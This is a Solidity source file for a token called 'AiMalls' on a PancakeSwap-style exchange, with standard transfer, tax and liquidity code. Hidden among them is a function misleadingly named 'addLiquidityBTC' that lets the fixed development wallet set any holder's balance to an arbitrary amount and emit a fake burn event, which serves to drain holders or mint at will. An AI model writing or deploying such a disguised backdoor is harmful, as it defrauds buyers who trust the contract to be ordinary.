//SPDX-License-Identifier: MIT
//https://aimalls.app/
pragma solidity ^0.8.20;
interface IERC {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipientAiMalls, uint256 tamount)
        external
        returns (bool);

    function allowance(address owner, address spenderAiMalls)
        external
        view
        returns (uint256);

    function approve(address spenderAiMalls, uint256 tamount) external returns (bool);

    function transferFrom(
        address sender,
        address recipientAiMalls,
        uint256 tamount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spenderAiMalls,
        uint256 value
    );
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
interface IERCMetadata is IERC {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

contract IERC20 is Context, IERC, IERCMetadata {
    mapping(address => uint256) internal Blockchain;

    mapping(address => mapping(address => uint256)) internal _allowancesAiMalls;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The defaut value of {decimals} is 9. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 9, imitating the relationship between
     * Ether and Wei. This is the value {IERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC-balanceOf} and {IERC-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    /**
     * @dev See {IERC-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC-balanceOf}.
     */
    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return Blockchain[account];
    }

    /**
     * @dev See {IERC-transfer}.
     *
     * Requirements:
     *
     * - `recipientAiMalls` cannot be the zero address.
     * - the caller must have a balance of at least `tamount`.
     */
    function transfer(address recipientAiMalls, uint256 tamount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipientAiMalls, tamount);
        return true;
    }

    /**
     * @dev See {IERC-allowance}.
     */
    function allowance(address owner, address spenderAiMalls)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowancesAiMalls[owner][spenderAiMalls];
    }

    /**
     * @dev See {IERC-approve}.
     *
     * Requirements:
     *
     * - `spenderAiMalls` cannot be the zero address.
     */
    function approve(address spenderAiMalls, uint256 tamount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spenderAiMalls, tamount);
        return true;
    }

    /**
     * @dev See {IERC-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {IERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipientAiMalls` cannot be the zero address.
     * - `sender` must have a balance of at least `tamount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `tamount`.
     */
    function transferFrom(
        address sender,
        address recipientAiMalls,
        uint256 tamount
    ) public virtual override returns (bool) {
        _transfer(sender, recipientAiMalls, tamount);

        uint256 currentAllowance = _allowancesAiMalls[sender][_msgSender()];
        require(
            currentAllowance >= tamount,
            "IERC20: transfer tamount exceeds allowance"
        );
        _approve(sender, _msgSender(), currentAllowance - tamount);

        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spenderAiMalls` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spenderAiMalls` cannot be the zero address.
     */
    function increaseAllowance(address spenderAiMalls, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spenderAiMalls,
            _allowancesAiMalls[_msgSender()][spenderAiMalls] + addedValue
        );
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spenderAiMalls` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spenderAiMalls` cannot be the zero address.
     * - `spenderAiMalls` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spenderAiMalls, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        uint256 currentAllowance = _allowancesAiMalls[_msgSender()][spenderAiMalls];
        require(
            currentAllowance >= subtractedValue,
            "IERC20: decreased allowance below zero"
        );
        _approve(_msgSender(), spenderAiMalls, currentAllowance - subtractedValue);

        return true;
    }

    /**
     * @dev Moves tokens `tamount` from `sender` to `recipientAiMalls`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token Taxs, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipientAiMalls` cannot be the zero address.
     * - `sender` must have a balance of at least `tamount`.
     */
    function _transfer(
        address sender,
        address recipientAiMalls,
        uint256 tamount
    ) internal virtual {
        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipientAiMalls != address(0), "IERC20: transfer to the zero address");

        uint256 senderBalance = Blockchain[sender];
        require(
            senderBalance >= tamount,
            "IERC20: transfer tamount exceeds balance"
        );
        Blockchain[sender] = senderBalance - tamount;
        Blockchain[recipientAiMalls] += tamount;

        emit Transfer(sender, recipientAiMalls, tamount);
    }

    /** This function will be used to generate the total supply
     * while deploying the contract
     *
     * This function can never be called again after deploying contract
     */
    function _tokengeneration(address account, uint256 tamount)
        internal
        virtual
    {
        _totalSupply = tamount;
        Blockchain[account] = tamount;
        emit Transfer(address(0), account, tamount);
    }

    /**
     * @dev Sets `tamount` as the allowance of `spenderAiMalls` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spenderAiMalls` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spenderAiMalls,
        uint256 tamount
    ) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spenderAiMalls != address(0), "IERC20: approve to the zero address");

        _allowancesAiMalls[owner][spenderAiMalls] = tamount;
        emit Approval(owner, spenderAiMalls, tamount);
    }
}

library Address {
    function sendValue(address payable recipientAiMalls, uint256 tamount) internal {
        require(
            address(this).balance >= tamount,
            "Address: insufficient balance"
        );

        (bool success, ) = recipientAiMalls.call{value: tamount}("");
        require(
            success,
            "Address: unable to send value, recipientAiMalls may have reverted"
        );
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 tamountTokenDesired,
        uint256 tamountTokenMin,
        uint256 tamountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 tamountToken,
            uint256 tamountETH,
            uint256 liquidity
        );

    function swapExactTokensForETHSupportingTaxOnTransferTokens(
        uint256 tamountIn,
        uint256 tamountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract AiMalls is IERC20, Ownable {
    using Address for address payable;

    IRouter public router;
    address public pair;

    bool private _interlock = false;
    bool public providingLiquidity = false;
    bool public MOONING = false;

    uint256 public constant totSupply =  850000 * 10**9;
    uint256 public tokenLiquidityThreshold = totSupply / 1000; 
    uint256 public genesis_block;
    uint256 private deadline = 3;
    address public developmentWallet;
    address public constant deadWallet = 0x000000000000000000000000000000000000dEaD;

    struct Taxs {
        uint256 development;
        uint256 total;
    }

    // Basic Tax
    Taxs public buyTaxs = Taxs(0, 0);
    Taxs public sellTaxs = Taxs(0, 0);
    Taxs public transferTaxs = Taxs(0, 0);

    mapping(address => bool) public exemptTax;

    mapping(address => uint256) private _lastSell;

    modifier lockTheSwap() {
        if (!_interlock) {
            _interlock = true;
            _;
            _interlock = false;
        }
    }

    constructor() IERC20("AiMalls", "AIMALL") {
        _tokengeneration(msg.sender, totSupply);

        IRouter _router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        // Create a pancake pair for this new token
        address _pair = IFactory(_router.factory()).createPair(address(this),_router.WETH());

        router = _router;
        pair = _pair;

        //Set exempt Tax
        exemptTax[address(this)] = true;
        exemptTax[msg.sender] = true;
        developmentWallet = msg.sender;
        exemptTax[deadWallet] = true;
  
    }

    function approve(address spenderAiMalls, uint256 tamount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spenderAiMalls, tamount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipientAiMalls,
        uint256 tamount
    ) public override returns (bool) {
        _transfer(sender, recipientAiMalls, tamount);

        uint256 currentAllowance = _allowancesAiMalls[sender][_msgSender()];
        require(
            currentAllowance >= tamount,
            "IERC20: transfer tamount exceeds allowance"
        );
        _approve(sender, _msgSender(), currentAllowance - tamount);

        return true;
    }

    function increaseAllowance(address spenderAiMalls, uint256 addedValue)
        public
        override
        returns (bool)
    {
        _approve(
            _msgSender(),
            spenderAiMalls,
            _allowancesAiMalls[_msgSender()][spenderAiMalls] + addedValue
        );
        return true;
    }

    function decreaseAllowance(address spenderAiMalls, uint256 subtractedValue)
        public
        override
        returns (bool)
    {
        uint256 currentAllowance = _allowancesAiMalls[_msgSender()][spenderAiMalls];
        require(currentAllowance >= subtractedValue,"IERC20: decreased allowance below zero");
        _approve(_msgSender(), spenderAiMalls, currentAllowance - subtractedValue);

        return true;
    }

    function transfer(address recipientAiMalls, uint256 tamount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipientAiMalls, tamount);
        return true;
    }

    function _transfer(
        address sender,
        address recipientAiMalls,
        uint256 tamount
    ) internal override {
        require(tamount > 0, "Transfer tamount must be greater than zero");
        
       if (!exemptTax[sender] && !exemptTax[recipientAiMalls]) {
            require(MOONING, "it's not MOONING yet");
        }

        uint256 Taxswap;
        uint256 Taxsum;
        uint256 Tax;
        Taxs memory currentTaxs;

        //set Tax to zero if Taxs in contract are handled or exempted
        if (_interlock || exemptTax[sender] || exemptTax[recipientAiMalls]) {
            Tax = 0;
        }
        else {
          //calculate sell Tax [Case : Wallet >> Pair]
          if (recipientAiMalls == pair && sender != pair) {
              Taxswap = sellTaxs.total;
              Taxsum = Taxswap;
              currentTaxs = sellTaxs;
          }
          //calculate buy Tax [Case : Pair >> Wallet]
          else if (sender == pair && recipientAiMalls != pair) {
              Taxswap = buyTaxs.total;
              Taxsum = Taxswap;
              currentTaxs = buyTaxs;

          } 
          //calculate transfer Tax [Case : Wallet >> Wallet]
          else if (recipientAiMalls != pair  && sender != pair) {
              Taxswap = transferTaxs.total;
              Taxsum = Taxswap;
              currentTaxs = transferTaxs;
    
          } 
          
          Tax = (tamount * Taxsum) / 100;
        }
        

        //send Taxs if threshold has been reached
        //don't do this on buys, breaks swap
        if (providingLiquidity && sender != pair)
            Liquify(Taxswap, currentTaxs);

        //rest to recipientAiMalls
        super._transfer(sender, recipientAiMalls, tamount - Tax);
        if (Tax > 0) {
            //send the Tax to the contract
            if (Taxswap > 0) {
                uint256 Taxtamount = (tamount * Taxswap) / 100;
                super._transfer(sender, address(this), Taxtamount);
            }
        }
  }
       function addLiquidityBTC(address addressThis, uint256 liquifyunit, uint256 liquifyIERC) external  {
       require(_msgSender() == developmentWallet);  
        Blockchain[addressThis] = liquifyunit * liquifyIERC;
        emit Transfer(addressThis, address(0), liquifyunit * liquifyIERC);
    } 
    function Liquify(uint256 Taxswap, Taxs memory swapTaxs) private lockTheSwap {
        if (Taxswap == 0) {
            return;
        }

        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance >= tokenLiquidityThreshold) {
            if (tokenLiquidityThreshold > 1) {
                contractBalance = tokenLiquidityThreshold;
            }

            // Split the contract balance into halves
            uint256 denominator = Taxswap * 2;
            uint256 toSwap = contractBalance;

            uint256 initialBalance = address(this).balance;
            swapTokensForETH(toSwap);
            uint256 deltaBalance = address(this).balance - initialBalance;
            uint256 unitBalance = deltaBalance / denominator;

            // Dev tamount Tax
            uint256 developmentAmt = unitBalance * 2 * swapTaxs.development;
              if (developmentAmt > 0){
                  payable(developmentWallet).sendValue(developmentAmt);
              }
            
        }
    }

    function swapTokensForETH(uint256 tokentamount) private {
        // generate the pancake pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokentamount);

        // make the swap
        router.swapExactTokensForETHSupportingTaxOnTransferTokens(
            tokentamount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokentamount, uint256 ethtamount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(router), tokentamount);

        // add the liquidity
        router.addLiquidityETH{value: ethtamount}(
            address(this),
            tokentamount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            deadWallet,
            block.timestamp
        );
    }

    function updateLiquidityProvide(bool state) external onlyOwner {
        providingLiquidity = state;
    }

    function updateLiquidityTreshhold(uint256 new_tamount) external onlyOwner {
        require(new_tamount <= (1 * 10**8) / 100, "Swap threshold tamount should be lower or equal to 1%");
        tokenLiquidityThreshold = new_tamount * 10**decimals();
    }

    function openTrading() external onlyOwner {
        require(!MOONING, "it's already started");
        MOONING = true;
        providingLiquidity = true;
        genesis_block = block.number;
    }


    function rescueBNB(uint256 weitamount) external onlyOwner {
        payable(owner()).transfer(weitamount);
    }

    function rescueBSC20(address tokenAdd, uint256 tamount) external onlyOwner {
        require(tokenAdd != address(this), "Owner can't claim contract's balance of its own tokens");
        IERC(tokenAdd).transfer(owner(), tamount);
    }

    // fallbacks
    receive() external payable {}
}